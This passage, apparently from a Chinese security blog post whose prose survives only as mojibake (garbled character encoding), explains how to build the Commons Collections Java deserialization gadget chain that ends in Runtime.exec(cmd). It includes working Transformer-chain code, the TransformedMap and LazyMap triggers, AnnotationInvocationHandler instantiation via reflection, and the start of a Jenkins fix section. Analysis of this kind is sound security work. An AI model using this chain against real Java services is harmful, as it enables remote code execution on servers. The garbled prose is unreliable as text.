class="line">rt.exec(cmd);</span><br></pre></td></tr></table></figure></div><p>å¾ˆç®€å•ï¼Œä¸€ä¸ªå•ä¾‹æ¨¡å¼çš„æ–¹æ³•è·å–åˆ°<code>Runtime</code>çš„å®ä¾‹ï¼Œå†è°ƒç”¨å®ƒçš„<code>exec()</code>æ‰§è¡Œå‘½ä»¤ã€‚åœ¨è¡¨è¾¾å¼æ³¨å…¥ç±»RCEæ¼æ´ä¸­ä¹Ÿå¯ä»¥é¢‘ç¹çœ‹åˆ°åˆ©ç”¨å„ç§æ¡ä»¶ç‰¹æ€§æ¥æ„é€ è¿™æ®µè¯­å¥çš„èº«å½±ï¼Œæ¯”å¦‚Struts2çš„OGNLï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(cmd)</span><br></pre></td></tr></table></figure></div><p>åˆæ¯”å¦‚Springçš„SpELï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure></div><p>è¿™é‡Œæ›¿å°ç™½é—®ä¸ªåŸºç¡€ä½†åˆå’Œæ¥ä¸‹æ¥çš„å†…å®¹æœ‰å…³çš„é—®é¢˜ï¼šä¸ºä»€ä¹ˆéƒ½è¦ä½¿ç”¨é“¾å¼ç»“æ„ï¼Ÿ</p><p>åŸå› å…¶å®å¾ˆç®€å•ï¼Œå› ä¸ºæ— è®ºæ˜¯è¡¨è¾¾å¼è§£ææ‰§è¡Œè¿˜æ˜¯ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚é€šè¿‡åå°„æŠ€æœ¯è·å–å¯¹è±¡è°ƒç”¨å‡½æ•°éƒ½ä¼šå­˜åœ¨ä¸€ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œä½¿ç”¨é“¾å¼ç»“æ„çš„è¯­å¥å¯ä»¥ä¿è¯æ‰§è¡Œè¿‡ç¨‹ä¸­è¿™ä¸ªä¸Šä¸‹æ–‡æ˜¯ä¸€è‡´çš„ã€‚ä½ ä¹Ÿå¯ä»¥æ¢ä¸ªæ–¹å¼é—®è‡ªå·±ï¼Œå¦‚æœä½ ç¬¬ä¸€æ¬¡è¯·æ±‚<code>Runtime.getRuntime()</code>ï¼Œé‚£å¦‚ä½•ä¿è¯ç¬¬äºŒæ¬¡è¯·æ±‚<code>rt.exec()</code>èƒ½å¤Ÿæ‹¿åˆ°ç¬¬ä¸€æ¬¡çš„<code>Runtime</code>å¯¹è±¡å‘¢ï¼Ÿ</p><p>äº†è§£äº†è¿™ä¸ªé—®é¢˜ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹å°è¯•ç”¨Commons Collectionså…ˆæ¥æ„é€ è¿™ä¸ªé“¾å¼ç»“æ„äº†ã€‚</p><p>å‰è¾ˆä»¬ä¸ºæˆ‘ä»¬åœ¨Commons Collectionsä¸­æ‰¾åˆ°äº†ä¸€ä¸ªç”¨äºå¯¹è±¡ä¹‹é—´è½¬æ¢çš„<code>Transformer</code>æ¥å£ï¼Œå®ƒæœ‰å‡ ä¸ªæˆ‘ä»¬ç”¨å¾—ç€çš„å®ç°ç±»ï¼š</p><ol><li><code>ConstantTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><code>InvokerTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">    Class cls = input.getClass();</span><br><span class="line">    Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><code>ChainedTransformer</code> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><p>åˆ©ç”¨è¿™å‡ ä¸ªå¯¹è±¡ï¼Œå¯ä»¥æ„é€ å‡ºä¸‹é¢è¿™æ¡é“¾ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; "getRuntime", new Class[0] &#125;),</span><br><span class="line">        new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; cmd &#125;)&#125;;</span><br><span class="line">Transformer chain = <span class="keyword">new</span> ChainedTransformer(trans);</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ï¼Œæ•°ç»„çš„ä¸­é—´ä¸¤ä¸ªå…ƒç´ æ˜¯æœ€è®©äººè´¹è§£çš„ï¼Œæˆ‘ä»¬ä¸€å¥ä¸€å¥æ¥è§£é‡Š <em>ï¼ˆå‰æ–¹é«˜èƒ½é¢„è­¦ï¼Œè¯·å¯¹ç…§ä¸Šé¢å‡ ä¸ª<code>Transformer</code>çš„é€»è¾‘ä»”ç»†çœ‹ï¼Œæ¥ä¸‹æ¥çš„å†…å®¹ç½‘ä¸Šæœ‰äº›è§£é‡Šæ˜¯å­˜åœ¨å‡ºå…¥çš„ï¼‰</em> ï¼š</p><ol><li>æ„é€ ä¸€ä¸ª<code>ConstantTransformer</code>ï¼ŒæŠŠ<code>Runtime</code>çš„<code>Class</code>å¯¹è±¡ä¼ è¿›å»ï¼Œåœ¨<code>transform()</code>æ—¶ï¼Œå§‹ç»ˆä¼šè¿”å›è¿™ä¸ªå¯¹è±¡</li><li>æ„é€ ä¸€ä¸ª<code>InvokerTransformer</code>ï¼Œå¾…è°ƒç”¨æ–¹æ³•åä¸º<code>getMethod</code>ï¼Œå‚æ•°ä¸º<code>getRuntime</code>ï¼Œåœ¨<code>transform()</code>æ—¶ï¼Œä¼ å…¥1çš„ç»“æœï¼Œæ­¤æ—¶çš„<code>input</code>åº”è¯¥æ˜¯<code>java.lang.Runtime</code>ï¼Œä½†ç»è¿‡<code>getClass()</code>åï¼Œ<code>cls</code>ä¸º<code>java.lang.Class</code>ï¼Œä¹‹åçš„<code>getMethod()</code>åªèƒ½è·å–<code>java.lang.Class</code>çš„æ–¹æ³•ï¼Œå› æ­¤æ‰ä¼šå®šä¹‰çš„å¾…è°ƒç”¨æ–¹æ³•åä¸º<code>getMethod</code>ï¼Œç„¶åå…¶å‚æ•°æ‰æ˜¯<code>getRuntime</code>ï¼Œå®ƒå¾—åˆ°çš„æ˜¯<code>getMethod</code>è¿™ä¸ªæ–¹æ³•çš„<code>Method</code>å¯¹è±¡ï¼Œ<code>invoke()</code>è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæœ€ç»ˆå¾—åˆ°çš„æ‰æ˜¯<code>getRuntime</code>è¿™ä¸ªæ–¹æ³•çš„<code>Method</code>å¯¹è±¡</li><li>æ„é€ ä¸€ä¸ª<code>InvokerTransformer</code>ï¼Œå¾…è°ƒç”¨æ–¹æ³•åä¸º<code>invoke</code>ï¼Œå‚æ•°ä¸ºç©ºï¼Œåœ¨<code>transform()</code>æ—¶ï¼Œä¼ å…¥2çš„ç»“æœï¼ŒåŒç†ï¼Œ<code>cls</code>å°†ä¼šæ˜¯<code>java.lang.reflect.Method</code>ï¼Œå†è·å–å¹¶è°ƒç”¨å®ƒçš„<code>invoke</code>æ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨ä¸Šé¢çš„<code>getRuntime()</code>æ‹¿åˆ°<code>Runtime</code>å¯¹è±¡</li><li>æ„é€ ä¸€ä¸ª<code>InvokerTransformer</code>ï¼Œå¾…è°ƒç”¨æ–¹æ³•åä¸º<code>exec</code>ï¼Œå‚æ•°ä¸ºå‘½ä»¤å­—ç¬¦ä¸²ï¼Œåœ¨<code>transform()</code>æ—¶ï¼Œä¼ å…¥3çš„ç»“æœï¼Œè·å–<code>java.lang.Runtime</code>çš„<code>exec</code>æ–¹æ³•å¹¶ä¼ å‚è°ƒç”¨</li><li>æœ€åæŠŠå®ƒä»¬ç»„è£…æˆä¸€ä¸ªæ•°ç»„å…¨éƒ¨æ”¾è¿›<code>ChainedTransformer</code>ä¸­ï¼Œåœ¨<code>transform()</code>æ—¶ï¼Œä¼šå°†å‰ä¸€ä¸ªå…ƒç´ çš„è¿”å›ç»“æœä½œä¸ºä¸‹ä¸€ä¸ªçš„å‚æ•°ï¼Œåˆšå¥½æ»¡è¶³éœ€æ±‚</li></ol><p>æ—¢ç„¶ç¬¬2ã€3æ­¥è¿™ä¹ˆç»•ï¼Œæˆ‘ä»¬åˆçŸ¥é“äº†ä¸ºä»€ä¹ˆï¼Œæ˜¯ä¸æ˜¯å¯ä»¥è€ƒè™‘ç”¨ä¸‹é¢è¿™ç§é€»è¾‘æ›´æ¸…æ™°çš„æ–¹å¼æ¥æ„é€ å‘¢ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]),</span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; cmd &#125;)&#125;;</span><br></pre></td></tr></table></figure></div><p>ç­”æ¡ˆæ˜¯ä¸è¡Œçš„ã€‚è™½ç„¶å•çœ‹æ•´ä¸ªé“¾ï¼Œæ— è®ºæ˜¯å®šä¹‰è¿˜æ˜¯æ‰§è¡Œéƒ½æ˜¯æ²¡æœ‰ä»»ä½•é—®é¢˜çš„ï¼Œä½†æ˜¯åœ¨åç»­åºåˆ—åŒ–æ—¶ï¼Œç”±äº<code>Runtime.getRuntime()</code>å¾—åˆ°çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¹Ÿéœ€è¦å‚ä¸åºåˆ—åŒ–è¿‡ç¨‹ï¼Œè€Œ<code>Runtime</code>æœ¬èº«æ˜¯æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£çš„ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´åºåˆ—åŒ–å¤±è´¥ã€‚</p><p>ä¹Ÿæœ‰åŒå­¦å¯èƒ½çœ‹è¿‡ysoserialæ„é€ çš„Payloadï¼Œå®ƒçš„ä¹ æƒ¯æ˜¯å…ˆå®šä¹‰ä¸€ä¸ªåŒ…å«ã€æ— æ•ˆã€<code>Transformer</code>çš„<code>ChainedTransformer</code>ï¼Œç­‰æ‰€æœ‰å¯¹è±¡è£…å¡«å®Œæ¯•ä¹‹åå†åˆ©ç”¨åå°„å°†å®é™…çš„æ•°ç»„æ”¾è¿›å»ã€‚è¿™ä¹ˆåšçš„åŸå› ä½œè€…ä¹Ÿåœ¨ä¸€ä¸ª<a href="https://github.com/frohoff/ysoserial/issues/32" target="_blank" rel="noopener">Issue</a>ä¸­ç»™äº†è§£é‡Šï¼Œæˆ‘ä»¬ç›´æ¥çœ‹åŸæ–‡ï¼š</p><blockquote><p>Generally any reflection at the end of gadget-chain set up is done to â€œarmâ€ the chain because constructing it while armed can result in premature â€œdetonationâ€ during set-up and cause it to be inert when serialized and deserialized by the target application.</p></blockquote><p>ç°åœ¨ï¼Œæœ‰äº†è¿™æ¡<code>Transformer</code>é“¾ï¼Œå°±ç­‰ç€è°æ¥æ‰§è¡Œå®ƒçš„<code>transform()</code>äº†ã€‚</p><p>ç½‘ä¸Šæµä¼ çš„ç¤ºä¾‹å¾ˆå¤šéƒ½æ˜¯ä½¿ç”¨ä¸€ä¸ªåä¸º<code>TransformedMap</code>çš„è£…é¥°å™¨æ¥è§¦å‘<code>transform()</code>ï¼Œå®ƒåœ¨è£…é¥°æ—¶ä¼šä¼ å…¥åŸå§‹<code>Map</code>ã€ä¸€ä¸ªé”®è½¬æ¢å™¨<code>Transformer</code>å’Œä¸€ä¸ªå€¼è½¬æ¢å™¨<code>Transformer</code>ï¼Œè€Œå®ƒçš„çˆ¶ç±»åœ¨å†…éƒ¨å®ç°äº†ä¸€ä¸ª<code>AbstractMapEntryDecorator</code>çš„å­ç±»ï¼Œä¼šåœ¨<code>setValue()</code>å‰è°ƒç”¨<code>checkSetValue()</code>è¿›è¡Œæ£€æŸ¥ï¼Œè€Œ<code>TransformedMap.checkSetValue()</code>ä¼šè°ƒç”¨å®ƒçš„å€¼è½¬æ¢å™¨çš„<code>transform()</code>ï¼Œå› æ­¤è£…é¥°ä»»æ„ä¸€ä¸ªæœ‰å…ƒç´ çš„<code>Map</code>å°±å¯ä»¥æ»¡è¶³éœ€æ±‚ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map m = TransformedMap.decorate(<span class="keyword">new</span> HashMap()&#123;&#123; put(<span class="string">"value"</span>, <span class="string">"anything"</span>); &#125;&#125;, <span class="keyword">null</span>, chain);</span><br></pre></td></tr></table></figure></div><p>è¿™æ—¶ï¼Œæˆ‘ä»¬åªéœ€è¦å†æ‰¾ä¸€ä¸ªåŒ…å«å¯æ§<code>Map</code>å­—æ®µï¼Œå¹¶ä¼šåœ¨ååºåˆ—åŒ–æ—¶å¯¹è¿™ä¸ª<code>Map</code>è¿›è¡Œ<code>setValue()</code>æˆ–<code>get()</code>æ“ä½œçš„å…¬å…±å¯¹è±¡ã€‚</p><p>å¹¸è¿çš„æ˜¯ï¼Œå‰è¾ˆä»¬åœ¨JDKè¾ƒæ—©çš„ç‰ˆæœ¬ä¸­å‘ç°äº†<code>AnnotationInvocationHandler</code>è¿™ä¸ªå¯¹è±¡ <em>ï¼ˆè¾ƒæ–°ç‰ˆæœ¬çš„JDKå¯ä»¥ä½¿ç”¨<code>BadAttributeValueExpException</code>ï¼Œåœ¨è¿™é‡Œå°±ä¸å±•å¼€äº†ï¼‰</em> ï¼Œå®ƒåœ¨åˆå§‹åŒ–æ—¶å¯ä»¥ä¼ å…¥ä¸€ä¸ª<code>Map</code>ç±»å‹å‚æ•°èµ‹å€¼ç»™å­—æ®µ<code>memberValues</code>ï¼Œ<code>readObject()</code>è¿‡ç¨‹ä¸­å¦‚æœæ»¡è¶³ä¸€å®šæ¡ä»¶å°±ä¼šå¯¹<code>memberValues</code>ä¸­çš„å…ƒç´ è¿›è¡Œ<code>setValue()</code>ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    s.<span class="title">defaultReadObject</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                    value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨éå†<code>memberValues.entrySet()</code>æ—¶ï¼Œä¼šç”¨é”®ååœ¨<code>memberTypes</code>ä¸­å°è¯•è·å–ä¸€ä¸ª<code>Class</code>ï¼Œå¹¶åˆ¤æ–­å®ƒæ˜¯å¦ä¸º<code>null</code>ï¼Œè¿™å°±æ˜¯åˆšæ‰è¯´çš„éœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚æ¥ä¸‹æ¥æ˜¯ç½‘ä¸Šå¾ˆå°‘æåˆ°è¿‡çš„ä¸€ä¸ªç»“è®ºï¼š</p><p>é¦–å…ˆï¼Œ<code>memberTypes</code>æ˜¯<code>AnnotationType</code>çš„ä¸€ä¸ªå­—æ®µï¼Œé‡Œé¢å­˜å‚¨ç€<code>Annotation</code>æ¥å£å£°æ˜çš„æ–¹æ³•ä¿¡æ¯ <em>ï¼ˆé”®åä¸ºæ–¹æ³•åï¼Œå€¼ä¸ºæ–¹æ³•è¿”å›ç±»å‹ï¼‰</em> ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨è·å–<code>AnnotationInvocationHandler</code>å®ä¾‹æ—¶ï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªæ–¹æ³•ä¸ªæ•°å¤§äº0çš„<code>Annotation</code>å­ç±» <em>ï¼ˆä¸€èˆ¬æ¥è¯´ï¼Œè‹¥æ–¹æ³•ä¸ªæ•°å¤§äº0ï¼Œéƒ½ä¼šåŒ…å«ä¸€ä¸ªåä¸º<code>value</code>çš„æ–¹æ³•ï¼‰</em> ï¼Œå¹¶ä¸”åŸå§‹<code>Map</code>ä¸­å¿…é¡»å­˜åœ¨ä»»æ„ä»¥è¿™äº›æ–¹æ³•åä¸ºé”®åçš„å…ƒç´ ï¼Œä¸”å…ƒç´ å€¼ä¸æ˜¯è¯¥æ–¹æ³•è¿”å›ç±»å‹çš„å®ä¾‹ï¼Œæ‰èƒ½é¡ºåˆ©è¿›å…¥<code>setValue()</code>çš„æµç¨‹ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor ctor = cls.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object o = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">m</span>)</span>;</span><br></pre></td></tr></table></figure></div><p>ä»¥ä¸Šæ˜¯<code>TransformedMap</code>çš„åˆ©ç”¨æ„é€ è¿‡ç¨‹ã€‚è€Œysoserialå®˜æ–¹æ›´å€¾å‘äºä½¿ç”¨<code>LazyMap</code>ä½œä¸ºè£…é¥°å™¨ï¼Œå®ƒåœ¨è£…é¥°æ—¶ä¼šä¼ å…¥åŸå§‹<code>Map</code>å’Œä¸€ä¸ª<code>Transformer</code>ä½œä¸ºå·¥å‚ï¼Œå½“<code>get()</code>è·å–å€¼æ—¶ï¼Œè‹¥é”®ä¸å­˜åœ¨ï¼Œå°±ä¼šè°ƒç”¨å·¥å‚çš„<code>transform()</code>åˆ›å»ºä¸€ä¸ªæ–°å€¼æ”¾å…¥<code>Map</code>ä¸­ï¼Œå› æ­¤è£…é¥°ä»»æ„ä¸€ä¸ªç©º<code>Map</code>ä¹Ÿå¯ä»¥æ»¡è¶³éœ€æ±‚ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map m = LazyMap.decorate(<span class="keyword">new</span> HashMap(), chain);</span><br></pre></td></tr></table></figure></div><p>ä½†ä¸<code>TransformedMap</code>ä¸åŒçš„æ˜¯ï¼Œ<code>AnnotationInvocationHandler.readObject()</code>ä¸­å¹¶æ²¡æœ‰ç›´æ¥çš„å¯¹<code>memberTypes</code>æ‰§è¡Œ<code>get()</code>æ“ä½œï¼Œåè€Œæ˜¯åœ¨å®ƒçš„<code>invoke()</code>ä¸­å­˜åœ¨<code>get()</code>ï¼Œä½†åˆå¯¹æ–¹æ³•åæœ‰ä¸€å®šçš„è¦æ±‚ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">    String member = method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"equals"</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line">        return equalsImpl(args[0]);</span><br><span class="line">    <span class="keyword">assert</span> paramTypes.length == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"toString"</span>))</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"hashCode"</span>))</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">"annotationType"</span>))</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line"></span><br><span class="line">    Object result = memberValues.get(member);</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ‰€ä»¥ï¼Œysoserialä½¿ç”¨JavaåŠ¨æ€ä»£ç†çš„æ–¹å¼å¤„ç†äº† <code>LazyMap</code> ï¼Œä½¿ <code>readObject()</code>åœ¨è°ƒç”¨<code>memberValues.entrySet()</code> æ—¶ä»£ç†è¿›å…¥<code>AnnotationInvocationHandler.invoke()</code>é˜¶æ®µï¼Œåˆšå¥½æ–¹æ³•å<code>entrySet</code>ä¹Ÿå¯ä»¥é¡ºåˆ©çš„è·³è¿‡å‰é¢çš„å‡ ä¸ªåˆ¤æ–­æ¡ä»¶ï¼Œæœ€ç»ˆè¾¾åˆ°ç›®çš„ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆPayloadä¸­ä¼šåŒ…å«ä¸¤ä¸ª<code>AnnotationInvocationHandler</code>çš„åŸå› ã€‚</p><hr><h2 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h2><p>Jenkinsåœ¨1.638ç‰ˆæœ¬çš„ <code>Connection.readObject()</code> ä¸­ï¼Œå°†é»˜è®¤çš„<code>ObjectInputStream</code>æ”¹ä¸ºäº†å…¶è‡ªå®šä¹‰çš„å­ç±»<code>ObjectInputStreamEx</code>ï¼Œå¹¶ä¼ å…¥<code>ClassFilter.DEFAULT</code>æ ¡éªŒè¿‡æ»¤ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">readObject</span><span 